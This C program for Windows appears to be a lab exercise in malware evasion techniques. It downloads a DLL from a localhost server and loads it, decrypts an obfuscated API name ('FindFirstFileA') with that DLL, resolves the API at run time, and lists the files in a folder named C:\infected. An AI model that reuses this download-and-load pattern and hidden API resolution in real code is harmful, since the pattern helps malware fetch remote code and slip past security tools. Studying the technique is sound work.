#include <stdio.h>
#include <stdlib.h>
#include <windows.h>
#include <urlmon.h>

// Declare the function pointer for FindFirstFileA
typedef HANDLE(WINAPI* PFindFirstFileA)(_In_ LPCSTR lpFileName, _Out_ LPWIN32_FIND_DATAA lpFindFileData);

int main() {

    /*
    Function downloads three files, namely "decryptdll.h", "decryptdll.c", and "decryptdll.dll" from a localhost apache server using the URLDownloadToFile function.It dynamically loads the downloaded "decryptdll.dll" using the LoadLibrary function, which returns a handle to the loaded DLL. It retrieves the function pointer for the "FindFirstFileA" function from the kernel32.dll. Finally, the loaded DLL is freed.
    */
    
    // Download the required DLL and header files
    printf("Entry");
    URLDownloadToFile(NULL, "http://localhost/decrypt_dll.h", "decryptdll.h", 0, NULL);
    FILE *f1=fopen("decryptdll.h","r");
    if(f1==NULL)
    {
        printf("error here");
    }
    printf("file .h downloaded\n");
    URLDownloadToFile(NULL, "http://localhost/decrypt_dll.c", "decryptdll.c", 0, NULL);
    f1=fopen("decryptdll.c","r");
    if(f1==NULL)
    {
        printf("error here");
    }
    printf("file .c downloaded\n");
    URLDownloadToFile(NULL, "http://localhost/decryptdll.dll", "decryptdll.dll", 0, NULL);
    f1=fopen("decryptdll.dll","r");
    if(f1==NULL)
    {
        printf("error here");
    }
    printf("file .dll downloaded\n");
    
    // Load the decryption DLL dynamically
    HINSTANCE hDecryptionDll = LoadLibrary("decryptdll.dll");
    printf("escn\n");
    
    if (hDecryptionDll == NULL) {
        printf("Error loading decryption DLL.\n");
        return 1;
    }

    // Get the function pointer for the decryption function
    typedef char* (*DecryptFunc)(const char*);
    DecryptFunc decryptFunc = (DecryptFunc)GetProcAddress(hDecryptionDll, "decrypt_string");

    // Decrypt the string "FindFirstFileA"
    char encryptedString[] = "AeliFtsriFdniF";
    char* decryptedString = decryptFunc(encryptedString);
    printf("Decrypted string: %s\n", decryptedString);

    // Get the function pointer for FindFirstFileA
    PFindFirstFileA pFindFirstFileA = (PFindFirstFileA)GetProcAddress(GetModuleHandle("kernel32.dll"), decryptedString);
    if (pFindFirstFileA == NULL) {
        printf("Error getting function pointer for %s.\n", decryptedString);
        return 1;
    }

    // Call FindFirstFileA with a filename pattern
    WIN32_FIND_DATAA findData;
    HANDLE hFind = pFindFirstFileA("C:\\infected\\*", &findData);
    if (hFind == INVALID_HANDLE_VALUE) {
        printf("Error calling %s.\n", decryptedString);
        return 1;
    }

    printf("Listing contents of C:\\infected:\n");
    do {
        printf("%s\n", findData.cFileName);
    } while (FindNextFileA(hFind, &findData) != 0);

    // Close the find handle
    FindClose(hFind);

    // Free the decryption DLL
    FreeLibrary(hDecryptionDll);

    return 0;
}

